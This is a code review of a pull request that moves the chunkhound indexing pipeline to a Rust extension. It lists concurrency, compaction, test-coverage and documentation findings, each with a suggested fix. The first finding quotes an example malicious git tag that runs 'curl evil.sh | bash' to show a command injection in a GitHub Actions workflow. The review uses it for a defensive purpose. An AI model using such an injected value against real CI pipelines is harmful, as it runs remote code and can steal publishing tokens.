# Code Review — PR #380 "Main rust flow"

**Repo:** chunkhound/chunkhound
**Author:** HananKavitzAmat
**Branch:** `main_rust_flow` → `main`
**State:** OPEN
**Size:** 121 files changed, ~22k line diff

Migrates the indexing pipeline from pure Python to a Rust native extension (`chunkhound_native`).

**Verdict:** 🚫 Request Changes — 2 Critical findings, plus a High-severity data-corruption-risk concurrency gap in the core Python↔Rust pipeline handoff.

| Severity | Count |
|----------|-------|
| 🔴 Critical | 2 |
| 🟠 High | 5 |
| 🟡 Medium | 4 |
| 🟢 Minor | 4 |
| **Total** | **15** |

---

## 🔴 Critical

### 1. Command injection via unsanitized `${{ inputs.tag }}` in new alert action
**File:** `.github/actions/alert-native-publish-failure/action.yml:43-45`

GitHub Actions substitutes `${{ }}` as raw text before bash parses the script. `inputs.tag` comes from `github.event.release.tag_name` or `github.ref_name` — a git tag, which may legally contain `"`, backtick, `$()`, `;`, `|`. A tag like `v1.2.0a1"; curl evil.sh | bash; echo "` breaks out of the quoted `--title`/`--body` args and runs arbitrary shell in a job holding `id-token: write` (PyPI OIDC trusted publisher) and `GH_TOKEN`.

**Suggested fix:**
```yaml
env:
  GH_TOKEN: ${{ github.token }}
  ALERT_TAG: ${{ inputs.tag }}
run: |
  gh issue create --repo "${{ github.repository }}" \
    --title "chunkhound-native publish failed for ${ALERT_TAG}" \
    --body "..."
```
Never interpolate the expression directly into the script text.

### 2. Crash-self-heal test never compares recovered chunks to the pre-crash baseline
**File:** `tests/contracts/test_force_reindex_crash_self_heal.py:29-60`

The test captures `chunks_before` (the known-good baseline), simulates the crash window, reindexes incrementally, then only asserts `chunks_after` is non-empty — it never compares `chunks_after` to `chunks_before` even though the reference value is right there. A partial self-heal (only some dirty files recover, or recovered chunks have wrong content) would still pass.

**Suggested fix:** replace `assert chunks_after` with an actual multiset-equality assertion against `chunks_before` (e.g. `assert_chunk_multiset_identical`).

---

## 🟠 High

### 3. No guard against a connection reopening on the DB file while Rust holds write ownership
**File:** `chunkhound/providers/database/duckdb_provider.py`, `serial_database_provider.py` — `release_for_rust_pipeline()`

There is no equivalent of the existing `is_compaction_in_progress()` flag for the Rust-ownership window. The MCP server's search-tool handlers never acquire the `_scan_lock` that guards background reindexing, so a search request arriving mid-Rust-reindex can lazily open a second `duckdb.connect()` on the same file Rust is actively writing — risking lock errors or silent on-disk corruption.

**Suggested fix:** add a `rust_pipeline_in_progress`-style flag mirroring `_compaction_in_progress`, checked by `execute_sync`/`execute_async`.

### 4. Stale `_skip_compaction` flag silently skips compaction after a Rust embed-error retry
**File:** `chunkhound/services/indexing_coordinator.py`, `directory_indexing_service.py`

`_skip_compaction` is set once at the top of `process_directory()` and only reset on the next call. When a Rust run has per-file embed errors, the Python-side retry pass writes new embeddings, then the second compaction boundary call still sees the stale flag from the just-finished Rust run and no-ops — those embeddings never get compacted this session.

**Suggested fix:** reset the flag once the Rust result is consumed, or thread "who owns compaction" through as a local value instead of an instance attribute.

### 5. Directory-anchored include patterns for unknown extensions are silently dropped
**File:** `chunkhound/services/indexing_coordinator.py::_filter_unsupported_extensions`, `realtime_path_filter.py::should_index`

Patterns like `src/**/*.proto` are silently dropped, contradicting the code's own docstring, which says such explicit requests should always be kept (only blanket `**/*` wildcards should be gated). A user with `"include": ["src/**/*.proto"]` gets those files silently never indexed, with no error or skip stat.

**Suggested fix:** only gate truly blanket patterns, not any directory-anchored one.

### 6. Embed provider/event-loop cache keyed only by OS thread id, never invalidated across pipeline runs
**File:** `chunkhound/pipeline_bridge.py::_embed_batch`

`_embed_providers`/`_embed_loops` module-level caches are keyed by `threading.get_ident()` and never cleared between separate `run_rust_pipeline()` calls in the same process. Since thread ids get recycled, a long-lived process (e.g. the MCP server indexing multiple directories) can silently reuse a stale embedding provider/config from an earlier run — no exception, just wrong embeddings.

**Suggested fix:** clear/rebuild these caches per `run_rust_pipeline()` call, or key by `(tid, id(embedding_cfg))`.

### 7. Incremental-update parity tests never check embedding parity, only chunk parity
**File:** `tests/contracts/test_incremental_updates.py`, `test_pipeline_parallel.py`

Both tests exercise the incremental/streaming path (highest-risk for the Rust rewrite) but only call `assert_chunk_multiset_identical()`, never `assert_identical()` (the helper that also compares embedding vectors) — even though the data needed is already collected. A bug where the Rust incremental path writes a stale/wrong embedding for a modified file would pass both tests undetected.

**Suggested fix:** also assert embedding-tuple multiset equality in both tests, matching the pattern in `test_identical_chunks.py`.

---

## 🟡 Medium

### 8. Checkpoint failures are silently swallowed before handoff to Rust
**File:** `chunkhound/providers/database/duckdb_provider.py::_executor_disconnect`

A `CHECKPOINT` failure during disconnect is caught and only logged, never re-raised; `release_for_rust_pipeline()` then treats "did not raise" as proof the data is durable before handing the file to Rust. A transient checkpoint failure would silently violate that correctness invariant.

**Suggested fix:** propagate or explicitly verify checkpoint success on this specific path.

### 9. `get_stats()` returns fabricated all-zero stats while Rust owns the DB connection
**File:** `chunkhound/services/indexing_coordinator.py::get_stats()`

While Rust owns the connection, this returns `{"files": 0, "chunks": 0, "embeddings": 0}`, indistinguishable from a genuinely empty database. A status-checking caller (e.g. an MCP tool) gets misleading data instead of a busy/indexing signal.

**Suggested fix:** surface an explicit "indexing in progress" status instead of zeros.

### 10. Parse pool size frozen on first use, ignoring later config changes
**File:** `chunkhound/pipeline_bridge.py::_get_parse_pool`

The process-wide `ProcessPoolExecutor` is sized once from whichever call wins the creation race; changing `indexing.max_concurrent` afterward is silently ignored for the life of the process. Documented in a docstring but easy to miss operationally in a long-lived server.

**Suggested fix:** document more prominently or support resizing; low priority.

### 11. Test name promises more coverage than it delivers
**File:** `tests/contracts/test_db_write_failure.py`

Named/scoped as if it covers "DB write fails mid-run, previously committed batches preserved," but the test only exercises a directory-can't-be-opened failure before any pipeline thread spawns. The docstring admits the harder mid-run/partial-commit scenario is deferred (no fault-injection seam exists yet), but the test name overstates coverage.

**Suggested fix:** rename to reflect actual scope; track the real mid-run scenario as follow-up work.

---

## 🟢 Minor

### 12. Coordinator state is unprotected shared mutable state (currently safe by convention only)
**File:** `chunkhound/services/indexing_coordinator.py`

`_skip_compaction` and related state are safe today only because the one relevant caller (`mcp_server/base.py`) happens to serialize via `_scan_lock`. Not exploitable today, but fragile — a future caller could reintroduce a race.

**Suggested fix:** add a comment/assertion documenting the reliance on external serialization.

### 13. Latent transaction-atomicity footgun (currently unreachable)
**File:** `chunkhound/providers/database/duckdb_provider.py::_executor_run_upsert_contract_step`

If ever called with an already-active outer transaction on a table with pre-existing duplicate rows, `CREATE UNIQUE INDEX` would fail with "Data contains duplicates" and nothing would auto-rollback the outer transaction. Verified unreachable today — no current call site has both conditions — but fragile for future callers.

**Suggested fix:** guard against this combination explicitly rather than relying on all future callers avoiding it.

### 14. Docstring/behavior mismatch for connection-pool fallback size
**File:** `chunkhound/providers/embeddings/openai_provider.py::_connection_limits`

Docstring says the fallback uses `RECOMMENDED_CONCURRENCY`-sized defaults, but the code hard-codes `max(10, requested_concurrency)`. Harmless today (10 > `RECOMMENDED_CONCURRENCY`=8), but would silently under-provision the pool if `RECOMMENDED_CONCURRENCY` is later raised above 10.

**Suggested fix:** reference `cls.RECOMMENDED_CONCURRENCY` instead of the literal `10`.

### 15. Dedup-logging sets keyed only by model name, process-global
**File:** `chunkhound/providers/embeddings/openai_provider.py`

Two provider instances for the same model but different config (e.g. different `output_dims`) in one process means the second instance's diagnostic log line never fires. Logging-only impact — no effect on actual embedding computation.

**Suggested fix:** key the dedup sets by `(model, output_dims)` or move dedup to instance level.

---

## ✅ Clean areas

The **Rust core** (`src/*.rs`, `Cargo.toml`/`Cargo.lock`, `chunkhound_native/__init__.py`) was reviewed in full against the project's Rust safety rules — no `unsafe` code, no `.unwrap()` at the PyO3 boundary, no `&str` borrowed across `py.allow_threads()`, and CPU/IO work correctly wrapped in `allow_threads` — and found **fully compliant with no defects**. SQL construction throughout is parameterized with no injection risk. The **CLI/config/embeddings layer** had only the two Minor findings above (#14, #15); its exception hierarchy, embedding-batching, and Protocol-contract changes are all consistent with their consumers.

---
*Reviewed by Ariel Vaknin via Claude Code*
